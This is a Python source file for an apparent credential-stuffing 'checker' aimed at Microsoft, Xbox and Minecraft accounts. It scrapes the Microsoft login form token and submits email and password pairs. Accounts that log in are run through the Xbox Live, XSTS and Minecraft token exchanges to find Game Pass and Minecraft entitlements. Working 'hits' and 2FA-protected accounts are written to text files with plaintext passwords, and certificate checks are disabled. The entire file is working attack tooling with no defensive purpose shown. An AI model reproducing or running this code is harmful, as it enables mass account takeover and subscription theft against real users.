"""
Xbox Game Pass Engine - Modular Xbox/Minecraft Account Checker
Handles authentication, account verification, and subscription detection
"""

import requests
import json
import re
import threading
import time
import os
from typing import Dict, List, Tuple, Optional, Any
from urllib.parse import urlparse, parse_qs

# Threading lock for thread-safe operations
engine_lock = threading.Lock()

# Xbox authentication constants
SFTAG_URL = (
    "https://login.live.com/oauth20_authorize.srf"
    "?client_id=00000000402B5328"
    "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
    "&scope=service::user.auth.xboxlive.com::MBI_SSL"
    "&display=touch&response_type=token&locale=en"
)

MAX_RETRIES = 3
REQUEST_TIMEOUT = 10


class XboxStats:
    """Thread-safe statistics collector for Xbox engine"""
    
    def __init__(self):
        self.total_checked = 0
        self.total_hits = 0
        self.minecraft_hits = 0
        self.gamepass_hits = 0
        self.xbox_hits = 0
        self.not_linked_hits = 0
        self.two_fa_accounts = 0
        self.bad_accounts = 0
        self.errors = 0
        self.retries = 0
        self.lock = threading.Lock()
    
    def increment_checked(self):
        """Increment total checked count"""
        with self.lock:
            self.total_checked += 1
    
    def increment_hit(self):
        """Increment total hits"""
        with self.lock:
            self.total_hits += 1
    
    def increment_minecraft(self):
        """Increment Minecraft hits"""
        with self.lock:
            self.minecraft_hits += 1
    
    def increment_gamepass(self):
        """Increment Game Pass hits"""
        with self.lock:
            self.gamepass_hits += 1
    
    def increment_xbox(self):
        """Increment Xbox hits"""
        with self.lock:
            self.xbox_hits += 1
    
    def increment_not_linked(self):
        """Increment not linked hits"""
        with self.lock:
            self.not_linked_hits += 1
    
    def increment_two_fa(self):
        """Increment 2FA accounts"""
        with self.lock:
            self.two_fa_accounts += 1
    
    def increment_bad(self):
        """Increment bad accounts"""
        with self.lock:
            self.bad_accounts += 1
    
    def increment_error(self):
        """Increment error count"""
        with self.lock:
            self.errors += 1
    
    def increment_retry(self):
        """Increment retry count"""
        with self.lock:
            self.retries += 1
    
    def get_stats(self) -> Dict[str, Any]:
        """Get current statistics snapshot"""
        with self.lock:
            return {
                'total_checked': self.total_checked,
                'total_hits': self.total_hits,
                'minecraft_hits': self.minecraft_hits,
                'gamepass_hits': self.gamepass_hits,
                'xbox_hits': self.xbox_hits,
                'not_linked_hits': self.not_linked_hits,
                'two_fa_accounts': self.two_fa_accounts,
                'bad_accounts': self.bad_accounts,
                'errors': self.errors,
                'retries': self.retries
            }


class MicrosoftAuthenticator:
    """Handles Microsoft account authentication"""
    
    @staticmethod
    def get_sftag(session: requests.Session, max_attempts: int = MAX_RETRIES) -> Tuple[Optional[str], Optional[str]]:
        """Get SFTAG and URL post from Microsoft login page"""
        for attempt in range(max_attempts):
            try:
                response = session.get(SFTAG_URL, timeout=REQUEST_TIMEOUT, verify=False)
                text = response.text
                
                # Try to find SFTAG value
                match = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
                if match:
                    sftag = match.group(1)
                    # Find URL post
                    match = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
                    if match:
                        return match.group(1), sftag
            except Exception:
                pass
            time.sleep(0.5)
        
        return None, None
    
    @staticmethod
    def login(session: requests.Session, email: str, password: str, url_post: str, sftag: str, 
              max_attempts: int = MAX_RETRIES) -> Tuple[Optional[str], str]:
        """Perform Microsoft account login"""
        for attempt in range(max_attempts):
            try:
                data = {
                    'login': email,
                    'loginfmt': email,
                    'passwd': password,
                    'PPFT': sftag
                }
                
                response = session.post(
                    url_post,
                    data=data,
                    headers={'Content-Type': 'application/x-www-form-urlencoded'},
                    allow_redirects=True,
                    timeout=REQUEST_TIMEOUT,
                    verify=False
                )
                
                # Check for successful token
                if '#' in response.url and response.url != SFTAG_URL:
                    token = parse_qs(urlparse(response.url).fragment).get('access_token', ["None"])[0]
                    if token != "None":
                        return token, "success"
                
                # Check for 2FA
                if any(v in response.text for v in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
                    return None, "2fa"
                
                # Check for bad credentials
                if any(v in response.text.lower() for v in ["password is incorrect", "account doesn't exist", "sign in to your microsoft account", "tried to sign in too many times"]):
                    return None, "bad"
                
            except Exception:
                pass
            
            time.sleep(0.5)
        
        return None, "error"


class XboxAuthenticator:
    """Handles Xbox Live authentication"""
    
    @staticmethod
    def get_xbox_token(session: requests.Session, ms_token: str, max_attempts: int = MAX_RETRIES) -> Tuple[Optional[str], Optional[str]]:
        """Exchange Microsoft token for Xbox Live token"""
        for attempt in range(max_attempts):
            try:
                payload = {
                    "Properties": {
                        "AuthMethod": "RPS",
                        "SiteName": "user.auth.xboxlive.com",
                        "RpsTicket": ms_token
                    },
                    "RelyingParty": "http://auth.xboxlive.com",
                    "TokenType": "JWT"
                }
                
                response = session.post(
                    'https://user.auth.xboxlive.com/user/authenticate',
                    json=payload,
                    headers={
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    timeout=REQUEST_TIMEOUT,
                    verify=False
                )
                
                if response.status_code == 200:
                    data = response.json()
                    xbox_token = data.get('Token')
                    uhs = data['DisplayClaims']['xui'][0]['uhs']
                    if xbox_token:
                        return xbox_token, uhs
                elif response.status_code == 429:
                    time.sleep(2)
                    continue
            
            except Exception:
                pass
            
            time.sleep(0.5)
        
        return None, None
    
    @staticmethod
    def get_xsts_token(session: requests.Session, xbox_token: str, max_attempts: int = MAX_RETRIES) -> Optional[str]:
        """Get XSTS token for Minecraft services"""
        for attempt in range(max_attempts):
            try:
                payload = {
                    "Properties": {
                        "SandboxId": "RETAIL",
                        "UserTokens": [xbox_token]
                    },
                    "RelyingParty": "rp://api.minecraftservices.com/",
                    "TokenType": "JWT"
                }
                
                response = session.post(
                    'https://xsts.auth.xboxlive.com/xsts/authorize',
                    json=payload,
                    headers={
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    timeout=REQUEST_TIMEOUT,
                    verify=False
                )
                
                if response.status_code == 200:
                    return response.json().get('Token')
                elif response.status_code == 429:
                    time.sleep(2)
                    continue
            
            except Exception:
                pass
            
            time.sleep(0.5)
        
        return None


class MinecraftAuthenticator:
    """Handles Minecraft authentication and profile retrieval"""
    
    @staticmethod
    def get_minecraft_token(session: requests.Session, uhs: str, xsts_token: str, 
                           max_attempts: int = MAX_RETRIES) -> Optional[str]:
        """Get Minecraft access token"""
        for attempt in range(max_attempts):
            try:
                response = session.post(
                    'https://api.minecraftservices.com/authentication/login_with_xbox',
                    json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"},
                    headers={'Content-Type': 'application/json'},
                    timeout=REQUEST_TIMEOUT,
                    verify=False
                )
                
                if response.status_code == 200:
                    return response.json().get('access_token')
                elif response.status_code == 429:
                    time.sleep(2)
                    continue
            
            except Exception:
                pass
            
            time.sleep(0.5)
        
        return None
    
    @staticmethod
    def check_entitlements(session: requests.Session, mc_token: str, max_attempts: int = MAX_RETRIES) -> Tuple[Optional[str], List[str]]:
        """Check Minecraft account entitlements (subscriptions/games)"""
        for attempt in range(max_attempts):
            try:
                response = session.get(
                    'https://api.minecraftservices.com/entitlements/mcstore',
                    headers={'Authorization': f'Bearer {mc_token}'},
                    timeout=REQUEST_TIMEOUT,
                    verify=False
                )
                
                if response.status_code == 200:
                    text = response.text
                    
                    # Check for subscriptions
                    if 'product_game_pass_ultimate' in text:
                        return 'Xbox Game Pass Ultimate', ["Xbox Game Pass Ultimate"]
                    elif 'product_game_pass_pc' in text:
                        return 'Xbox Game Pass', ["Xbox Game Pass"]
                    elif '"product_minecraft"' in text:
                        return 'Minecraft', ["Minecraft Java"]
                    else:
                        # Check for other games
                        others = []
                        if 'product_minecraft_bedrock' in text:
                            others.append("Bedrock")
                        if 'product_legends' in text:
                            others.append("Legends")
                        if 'product_dungeons' in text:
                            others.append("Dungeons")
                        
                        if others:
                            return 'Xbox: ' + ', '.join(others), others
                        
                        return None, []
                
                elif response.status_code == 404:
                    return None, []
                elif response.status_code == 429:
                    time.sleep(2)
                    continue
            
            except Exception:
                pass
            
            time.sleep(0.5)
        
        return None, []
    
    @staticmethod
    def get_profile(session: requests.Session, mc_token: str, max_attempts: int = MAX_RETRIES) -> Optional[Dict[str, Any]]:
        """Get Minecraft profile information"""
        for attempt in range(max_attempts):
            try:
                response = session.get(
                    'https://api.minecraftservices.com/minecraft/profile',
                    headers={'Authorization': f'Bearer {mc_token}'},
                    timeout=REQUEST_TIMEOUT,
                    verify=False
                )
                
                if response.status_code == 200:
                    return response.json()
                elif response.status_code == 404:
                    return None
                elif response.status_code == 429:
                    time.sleep(2)
                    continue
            
            except Exception:
                pass
            
            time.sleep(0.5)
        
        return None


class XboxEngine:
    """Main Xbox Game Pass checking engine"""
    
    def __init__(self, results_dir: str = "Results"):
        self.results_dir = results_dir
        self.stats = XboxStats()
        
        # Ensure results directories exist
        self.dirs = {
            "minecraft": os.path.join(results_dir, "Minecraft"),
            "gamepass": os.path.join(results_dir, "GamePass"),
            "xbox": os.path.join(results_dir, "Xbox"),
            "not_linked": os.path.join(results_dir, "HitNotLinked"),
            "two_fa": os.path.join(results_dir, "2FA"),
        }
        
        for d in self.dirs.values():
            os.makedirs(d, exist_ok=True)
    
    def check_account(self, email: str, password: str) -> Optional[Dict[str, Any]]:
        """Check a single account for Xbox/Minecraft subscriptions"""
        self.stats.increment_checked()
        
        try:
            session = requests.Session()
            session.verify = False
            
            # Step 1: Get SFTAG
            url_post, sftag = MicrosoftAuthenticator.get_sftag(session)
            if not url_post or not sftag:
                self.stats.increment_error()
                return None
            
            # Step 2: Microsoft authentication
            ms_token, auth_status = MicrosoftAuthenticator.login(session, email, password, url_post, sftag)
            
            if auth_status == "2fa":
                self.stats.increment_two_fa()
                self.stats.increment_hit()
                self.save_two_fa(email, password)
                return {
                    "email": email,
                    "password": password,
                    "status": "2fa",
                    "account_type": "2FA Protected"
                }
            
            elif auth_status == "bad":
                self.stats.increment_bad()
                return None
            
            elif auth_status != "success" or not ms_token:
                self.stats.increment_error()
                return None
            
            # Step 3: Get Xbox token
            xbox_token, uhs = XboxAuthenticator.get_xbox_token(session, ms_token)
            if not xbox_token or not uhs:
                self.stats.increment_bad()
                return None
            
            # Step 4: Get XSTS token
            xsts_token = XboxAuthenticator.get_xsts_token(session, xbox_token)
            if not xsts_token:
                self.stats.increment_bad()
                return None
            
            # Step 5: Get Minecraft token
            mc_token = MinecraftAuthenticator.get_minecraft_token(session, uhs, xsts_token)
            if not mc_token:
                self.stats.increment_bad()
                return None
            
            # Step 6: Check entitlements
            account_type, subscriptions = MinecraftAuthenticator.check_entitlements(session, mc_token)
            
            if not account_type:
                # Valid Xbox but no games/subscriptions
                self.stats.increment_not_linked()
                self.stats.increment_hit()
                self.save_not_linked(email, password)
                return {
                    "email": email,
                    "password": password,
                    "status": "not_linked",
                    "account_type": "Xbox (Not Linked)",
                    "name": "N/A",
                    "uuid": "N/A",
                    "capes": "N/A",
                    "subscriptions": []
                }
            
            # Step 7: Get profile information
            profile = MinecraftAuthenticator.get_profile(session, mc_token)
            
            name = profile.get('name', 'N/A') if profile else "Not Set"
            uuid = profile.get('id', 'N/A') if profile else "N/A"
            capes = ", ".join([c["alias"] for c in profile.get("capes", [])]) if profile else "None"
            if not capes:
                capes = "None"
            
            # Build result
            result = {
                "email": email,
                "password": password,
                "status": "valid",
                "account_type": account_type,
                "name": name,
                "uuid": uuid,
                "capes": capes,
                "subscriptions": subscriptions
            }
            
            # Track and save results
            self.stats.increment_hit()
            
            if 'Ultimate' in account_type or 'Game Pass' in account_type:
                self.stats.increment_gamepass()
                self.save_result("gamepass", result)
            elif 'Minecraft' in account_type:
                self.stats.increment_minecraft()
                self.save_result("minecraft", result)
            else:
                self.stats.increment_xbox()
                self.save_result("xbox", result)
            
            return result
        
        except Exception:
            self.stats.increment_error()
            return None
    
    def save_result(self, category: str, result: Dict[str, Any]):
        """Save account result to file"""
        try:
            subs_str = ", ".join(result.get('subscriptions', [])) if result.get('subscriptions') else "None"
            
            capture = (
                f"Email         : {result['email']}\n"
                f"Password      : {result['password']}\n"
                f"Name          : {result['name']}\n"
                f"UUID          : {result['uuid']}\n"
                f"Capes         : {result['capes']}\n"
                f"Type          : {result['account_type']}\n"
                f"Subscriptions : {subs_str}\n"
                f"{'='*60}"
            )
            
            file_name = {
                "minecraft": "Minecraft-hits_by_bot.txt",
                "gamepass": "game_pass-hits_by_bot.txt",
                "xbox": "xbox-hits_by_bot.txt",
            }.get(category, "hits.txt")
            
            file_path = os.path.join(self.dirs.get(category, self.results_dir), file_name)
            
            with open(file_path, 'a', encoding='utf-8') as f:
                f.write(capture + '\n')
        
        except Exception:
            pass
    
    def save_not_linked(self, email: str, password: str):
        """Save not linked account"""
        try:
            file_path = os.path.join(self.dirs["not_linked"], "not_linked_by_bot.txt")
            with open(file_path, 'a', encoding='utf-8') as f:
                f.write(f"{email}:{password} | Xbox (Not Linked)\n")
        except Exception:
            pass
    
    def save_two_fa(self, email: str, password: str):
        """Save 2FA protected account"""
        try:
            file_path = os.path.join(self.dirs["two_fa"], "2fa_by_bot.txt")
            with open(file_path, 'a', encoding='utf-8') as f:
                f.write(f"{email}:{password}\n")
        except Exception:
            pass
    
    def get_stats(self) -> Dict[str, Any]:
        """Get current statistics"""
        return self.stats.get_stats()
